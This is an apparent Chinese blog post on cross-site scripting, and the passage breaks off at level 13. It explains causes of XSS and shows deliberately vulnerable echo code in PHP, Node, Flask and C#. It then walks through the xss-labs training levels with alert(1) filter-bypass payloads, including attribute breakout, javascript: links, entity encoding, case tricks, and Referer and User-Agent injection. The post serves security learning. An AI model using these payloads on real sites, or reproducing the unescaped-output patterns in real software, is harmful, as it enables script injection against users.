    <content type="html"><![CDATA[<h1 id="XSS学习"><a href="#XSS学习" class="headerlink" title="XSS学习"></a>XSS学习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在IoT设备中，也有遇到过XSS的情况，在此学习ing</p><h2 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h2><p>xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是<strong>寻找参数未过滤的输出函数</strong>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xss</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xss</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="产生层面"><a href="#产生层面" class="headerlink" title="产生层面"></a>产生层面</h2><p>产生层面一般都是在前端，JavaScript代码能干什么，执行之后就会达到相应的效果</p><h2 id="函数类"><a href="#函数类" class="headerlink" title="函数类"></a>函数类</h2><p>比如说php中的脚本的输出函数</p><p>常见的输出函数有：<code>print</code>、<code>print_r</code>、<code>echo</code>、<code>printf</code>、<code>sprintf</code>、<code>die</code>、<code>var_dump</code>、<code>var_export</code></p><p>其实<strong>归根结底</strong>，XSS的攻击方式就是想办法“教唆”用户的浏览器去执行一些这个网页中原本不存在的<strong>前端代码</strong>。</p><h2 id="什么导致xss"><a href="#什么导致xss" class="headerlink" title="什么导致xss"></a>什么导致xss</h2><p><strong>输入验证和清理不足</strong></p><p>Web 应用程序接受用户数据（例如通过表单），并使用这些数据动态生成 HTML 页面。因此，恶意脚本可以作为合法输入的一部分嵌入，并最终由浏览器执行，除非经过充分清理。</p><p><strong>缺乏输出编码</strong></p><p>用户可以使用各种字符来改变 Web 浏览器处理和显示网页的方式。对于 HTML 部分，将<code>&lt;</code>、<code>&gt;</code>、<code>&quot;</code>、<code>&#39;</code>和<code>&amp;</code>等字符正确编码为各自的 HTML 编码至关重要。对于 JavaScript，应特别注意转义<code>&#39;</code>、<code>&quot;</code>和<code>\</code>。<strong>无法正确编码用户提供的数据</strong>是导致XSS漏洞的主要原因。</p><p><strong>安全标头使用不当</strong></p><p>各种安全标头都可以帮助缓解XSS漏洞。例如，内容安全策略 ( CSP )通过定义哪些来源可信任可执行脚本来缓解XSS风险。配置错误的CSP（例如过于宽松的策略或不当使用<code>unsafe-inline</code>或<code>unsafe-eval</code>指令）可能会让攻击者更容易执行其XSS负载。</p><p><strong>框架和语言漏洞</strong></p><p>一些较<strong>旧的 Web 框架</strong>未提供针对XSS的安全机制；其他一些框架存在未修补的XSS漏洞。现代 Web 框架在设计上会自动避开XSS，并及时修补任何发现的漏洞。</p><p><strong>第三方库</strong></p><p>在 Web 应用程序中集成第三方库可能会引入XSS漏洞；即使核心 Web 应用程序不易受到攻击。</p><h2 id="Bug-code"><a href="#Bug-code" class="headerlink" title="Bug code"></a>Bug code</h2><p>一个简单的反射型XSS漏洞是当<strong>用户搜索某个术语</strong>时，<strong>搜索字符串会逐字包含在结果页面中</strong>。这种简单的情况为攻击者提供了一个容易利用的目标。</p><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$search_query</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;You searched for: <span class="subst">$search_query</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/search&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> searchTerm = req.<span class="property">query</span>.<span class="property">q</span>;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;You searched for: &#x27;</span> + searchTerm);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">80</span>);</span><br></pre></td></tr></table></figure><h3 id="Python（Flask）"><a href="#Python（Flask）" class="headerlink" title="Python（Flask）"></a>Python（Flask）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/search&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    query = request.args.get(<span class="string">&quot;q&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;You searched for: <span class="subst">&#123;query&#125;</span>!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="C"><a href="#C" class="headerlink" title="C#"></a>C#</h3><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Page_Load</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> userInput = Request.QueryString[<span class="string">&quot;q&quot;</span>];</span><br><span class="line">    Response.Write(<span class="string">&quot;User Input: &quot;</span> + userInput);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="xss-lab"><a href="#xss-lab" class="headerlink" title="xss-lab"></a>xss-lab</h1><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>直接输入<code>?name=&lt;script&gt;alert(1)&lt;/script&gt;</code>就可以发现没被过滤直接成功</p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>照常输入<code>?name=&lt;script&gt;alert(1)&lt;/script&gt;</code>F12发现被转义成 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;lt;script&amp;gt;<span class="title function_ invoke__">alert</span>(<span class="number">1</span>);&amp;lt;/script&amp;gt;</span><br></pre></td></tr></table></figure><p>但是往下看会发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&lt;script&gt;alert(1);&lt;/script&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>在value中没被转义，因此可以构造</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&quot;</span>&gt;&lt;script&gt;<span class="built_in">alert</span>(<span class="number">1</span>);&lt;/script&gt;&lt;<span class="string">&quot;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>即输入 <code>?name=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;&quot;</code></p><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>这一题涉及一个知识点</p><p>在 8.1.0 及以上的 PHP 版本中，这个函数默认会转义 <code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、<code>&#39;</code>、<code>&quot;</code> 这五个字符，基本可以防范这里的 XSS 攻击。<br>但是，8.1.0 以下版本的 PHP 默认只会转义 <code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、<code>&quot;</code> 这四个字符，不会转义单引号 <code>&#39;</code>。这就给这个函数带来了巨大的安全隐患。</p><p>我们可以通过探测语句来看到这一点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x27;</span><br><span class="line">&quot;</span><br><span class="line">()</span><br><span class="line">&lt; &gt;</span><br><span class="line">&lt;script&gt; &lt;/script&gt;</span><br><span class="line">&lt;Script&gt; &lt;/Script&gt;</span><br><span class="line">&lt;scrscriptipt&gt; &lt;SCRscriptIPT&gt;</span><br><span class="line">Onerror</span><br><span class="line">onerror</span><br><span class="line">javascript:</span><br><span class="line">JavaScript:</span><br><span class="line">&lt;!-- --&gt;</span><br><span class="line">eval()</span><br><span class="line">&lt;a&gt;</span><br><span class="line">&lt;img&gt;</span><br><span class="line">&lt;iframe&gt;</span><br><span class="line">&lt;form&gt;</span><br><span class="line">src</span><br><span class="line">&#123;&#125;</span><br><span class="line">/</span><br><span class="line">+</span><br></pre></td></tr></table></figure><p>打进去看见</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;没有找到和<span class="string">&#x27; &amp;quot; () &amp;lt; &amp;gt; &amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;Script&amp;gt; &amp;lt;/Script&amp;gt; &amp;lt;scrscriptipt&amp;gt; &amp;lt;SCRscriptIPT&amp;gt; Onerror onerror javascript: JavaScript: &amp;lt;!-- --&amp;gt; eval() &amp;lt;a&amp;gt; &amp;lt;img&amp;gt; &amp;lt;iframe&amp;gt; &amp;lt;form&amp;gt; src &#123;&#125; / +相关的结果.&lt;/h2&gt;&lt;center&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;   //未被转义</span></span><br><span class="line"><span class="string">&quot;   //转译成&amp;quot;</span></span><br><span class="line"><span class="string">()  //未被转义</span></span><br><span class="line"><span class="string">&lt; &gt; //&amp;lt; &amp;gt;</span></span><br><span class="line"><span class="string">&lt;script&gt; &lt;/script&gt; //&amp;lt;script&amp;gt; &amp;lt;/script&amp;gt;</span></span><br><span class="line"><span class="string">&lt;Script&gt; &lt;/Script&gt; //&amp;lt;Script&amp;gt; &amp;lt;/Script&amp;gt;</span></span><br><span class="line"><span class="string">&lt;scrscriptipt&gt; &lt;SCRscriptIPT&gt; //&amp;lt;scrscriptipt&amp;gt; &amp;lt;SCRscriptIPT&amp;gt;</span></span><br><span class="line"><span class="string">Onerror //未被转义</span></span><br><span class="line"><span class="string">onerror //未被转义</span></span><br><span class="line"><span class="string">javascript: //未被转义</span></span><br><span class="line"><span class="string">JavaScript: //未被转义</span></span><br><span class="line"><span class="string">&lt;!-- --&gt; //&amp;lt;!-- --&amp;gt;</span></span><br><span class="line"><span class="string">eval() //未被转义</span></span><br><span class="line"><span class="string">&lt;a&gt; //&amp;lt;a&amp;gt;</span></span><br><span class="line"><span class="string">&lt;img&gt; //&amp;lt;img&amp;gt;</span></span><br><span class="line"><span class="string">&lt;iframe&gt; //&amp;lt;ifname&amp;gt;</span></span><br><span class="line"><span class="string">&lt;form&gt; //&amp;lt;form&amp;gt;</span></span><br><span class="line"><span class="string">src //未被转义</span></span><br><span class="line"><span class="string">&#123;&#125; //未被转义</span></span><br><span class="line"><span class="string">/ //未被转义</span></span><br><span class="line"><span class="string">+ //未被转义</span></span><br></pre></td></tr></table></figure><p>没有被过滤单引号，然后发现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&#x27;&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>value是通过单引号来闭合的，因此可以提前闭合value，但是没有&lt;&gt;就无法闭合标签，考虑使用触发器</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&#x27;&#x27; onblur=&#x27;</span><span class="built_in">alert</span>(<span class="number">1</span>)<span class="string">&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p><code>?name=&#39; onblur=&#39;alert(1)</code></p><p>input没有onerror，而onblur是失去焦点触发，因此搜索框随便输点东西之后点其他地方就成功触发</p><p>注意：空格</p><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;没有找到和<span class="string">&#x27; &amp;quot; () &amp;lt; &amp;gt; &amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;Script&amp;gt; &amp;lt;/Script&amp;gt; &amp;lt;scrscriptipt&amp;gt; &amp;lt;SCRscriptIPT&amp;gt; Onerror onerror javascript: JavaScript: &amp;lt;!-- --&amp;gt; eval() &amp;lt;a&amp;gt; &amp;lt;img&amp;gt; &amp;lt;iframe&amp;gt; &amp;lt;form&amp;gt; src &#123;&#125; / +相关的结果.&lt;/h2&gt;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span> <span class="string">&quot; ()   script /script Script /Script scrscriptipt SCRscriptIPT Onerror onerror javascript: JavaScript: !-- -- eval() a img iframe form src &#123;&#125; / +&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>发现value的双引号未被过滤且双引号闭合，因此类似level3</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; onblur=&quot;</span><span class="built_in">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;没有找到和<span class="string">&#x27; &amp;quot; () &amp;lt; &amp;gt; &amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;scrscriptipt&amp;gt; &amp;lt;scrscriptipt&amp;gt; onerror onerror javascript: javascript: &amp;lt;!-- --&amp;gt; eval() &amp;lt;a&amp;gt; &amp;lt;img&amp;gt; &amp;lt;iframe&amp;gt; &amp;lt;form&amp;gt; src &#123;&#125; / +相关的结果.&lt;/h2&gt;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span> <span class="string">&quot; () &lt; &gt; &lt;scr_ipt&gt; &lt;/script&gt; &lt;scr_ipt&gt; &lt;/script&gt; &lt;scrscriptipt&gt; &lt;scrscriptipt&gt; o_nerror o_nerror javascript: javascript: &lt;!-- --&gt; eval() &lt;a&gt; &lt;img&gt; &lt;iframe&gt; &lt;form&gt; src &#123;&#125; / +&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>发现&lt;&gt;和javascript未被过滤，但是script和on被转义成scr_ipt和o_n</p><blockquote><p><a> 标签是 HTML 中的锚点元素，主要用于创建链接，也可以用来执行js</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&quot;</span>&gt;&lt;a href=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;hack&lt;/a&gt;&lt;<span class="string">&quot;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>输入 <code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;hack&lt;/a&gt;&lt;&quot;</code>成功hack</p><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;没有找到和<span class="string">&#x27; &amp;quot; () &amp;lt; &amp;gt; &amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;Script&amp;gt; &amp;lt;/Script&amp;gt; &amp;lt;scrscriptipt&amp;gt; &amp;lt;SCRscriptIPT&amp;gt; Onerror onerror javascript: JavaScript: &amp;lt;!-- --&amp;gt; eval() &amp;lt;a&amp;gt; &amp;lt;img&amp;gt; &amp;lt;iframe&amp;gt; &amp;lt;form&amp;gt; src &#123;&#125; / +相关的结果.&lt;/h2&gt;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span> <span class="string">&quot; () &lt; &gt; &lt;scr_ipt&gt; &lt;/script&gt; &lt;Script&gt; &lt;/Script&gt; &lt;scrscriptipt&gt; &lt;SCRscriptIPT&gt; Onerror o_nerror javascript: JavaScript: &lt;!-- --&gt; eval() &lt;a&gt; &lt;img&gt; &lt;iframe&gt; &lt;form&gt; sr_c &#123;&#125; / +&quot;</span>&gt;    </span><br></pre></td></tr></table></figure><p>但是发现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&quot;</span>&gt;&lt;a hr_ef=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;hack&lt;/a&gt;&lt;<span class="string">&quot;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>href被转义掉了，但是看上面的尝试，会发现大写可用，尝试大写hREF成功</p><blockquote><p>HTML大小写不敏感</p></blockquote><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;没有找到和<span class="string">&#x27; &amp;quot; () &amp;lt; &amp;gt; &amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;scrscriptipt&amp;gt; &amp;lt;scrscriptipt&amp;gt; onerror onerror javascript: javascript: &amp;lt;!-- --&amp;gt; eval() &amp;lt;a&amp;gt; &amp;lt;img&amp;gt; &amp;lt;iframe&amp;gt; &amp;lt;form&amp;gt; src &#123;&#125; / +相关的结果.&lt;/h2&gt;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span> <span class="string">&quot; () &lt; &gt; &lt;&gt; &lt;/&gt; &lt;&gt; &lt;/&gt; &lt;script&gt; &lt;script&gt; error error java: java: &lt;!-- --&gt; eval() &lt;a&gt; &lt;img&gt; &lt;iframe&gt; &lt;form&gt;  &#123;&#125; / +&quot;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现script和on都会被过滤掉，但是只过滤了一次，因此</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&quot;</span>&gt;&lt;scrscriptipt&gt;<span class="built_in">alert</span>(<span class="number">1</span>);&lt;/scrscriptipt&gt;&lt;<span class="string">&quot;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p><code>&quot;&gt;&lt;scrscriptipt&gt;alert(1);&lt;/scrscriptipt&gt;&lt;&quot;</code></p><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>发现输入的值被拼接到</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=<span class="string">&quot;11&quot;</span>&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure><p>href后，但是JavaScript被转义了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=<span class="string">&quot;&#x27; &amp;quot () &lt; &gt; &lt;scr_ipt&gt; &lt;/scr_ipt&gt; &lt;scr_ipt&gt; &lt;/scr_ipt&gt; &lt;scrscr_iptipt&gt; &lt;scrscr_iptipt&gt; o_nerror o_nerror javascr_ipt: javascr_ipt: &lt;!-- --&gt; eval() &lt;a&gt; &lt;img&gt; &lt;iframe&gt; &lt;form&gt; sr_c &#123;&#125; / +&quot;</span>&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure><blockquote><p>这里要用到 href 属性的一个特性：href 传入的 URI 中，也可以使用 HTML 字符实体。在打开链接时，字符实体也会被转换为对应的字符。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:<span class="built_in">alert</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>会检测http:&#x2F;&#x2F;</p><p>因此</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascr&amp;#x69;pt:<span class="built_in">alert</span>(<span class="number">1</span>);<span class="comment">//http://</span></span><br></pre></td></tr></table></figure><h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/xss-levels/level10.php?keyword=test&amp;t_link=tlink&amp;t_history=thist&amp;t_sort=tsort</span></span><br></pre></td></tr></table></figure><p>会发现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level10&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;没有找到和test相关的结果.&lt;/h2&gt;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_link&quot;</span>  value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_history&quot;</span>  value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_sort&quot;</span>  value=<span class="string">&quot;tsort&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>变成这样，因此t_sort是有值的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_sort&quot;</span>  value=<span class="string">&quot;&#x27; &quot;</span> ()   script /script Script /Script scrscriptipt SCRscriptIPT Onerror onerror javascript: JavaScript: !-- -- <span class="built_in">eval</span>() a img iframe form src &#123;&#125; /  <span class="string">&quot; type=&quot;</span>hidden<span class="string">&quot;&gt;</span></span><br></pre></td></tr></table></figure><p>只过滤掉了&lt;&gt;</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_sort&quot;</span>  value=<span class="string">&quot;&quot;</span> onmouseover=javascript:<span class="built_in">alert</span>(<span class="number">1</span>) type=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; onmouseover=javascript:alert(1) type=&quot;</span></span><br></pre></td></tr></table></figure><h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p>发现存在referer字段</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_ref&quot;</span>  value=<span class="string">&quot;http://localhost/xss-levels/level10.php?keyword=&amp;t_sort=%22%20onmouseover=javascript:alert(1)%20type=%22&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>BP抓包</p><p><img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250123115706229.png" alt="image-20250123115706229"></p><p>讲Referrer改为” onmouseover&#x3D;javascript:alert(1) type&#x3D;”通过，成功</p><h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_link&quot;</span>  value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_history&quot;</span>  value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_sort&quot;</span>  value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_ua&quot;</span>  value=<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure><p>发现有ua段，显然是用户信息，因此BP修改</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_ua&quot;</span>  value=<span class="string">&quot;&quot;</span> onmouseover=javascript:<span class="built_in">alert</span>(<span class="number">1</span>) type=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_link&quot;</span>  value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_history&quot;</span>  value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_sort&quot;</span>  value=<span class="string">&quot;tsort&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span 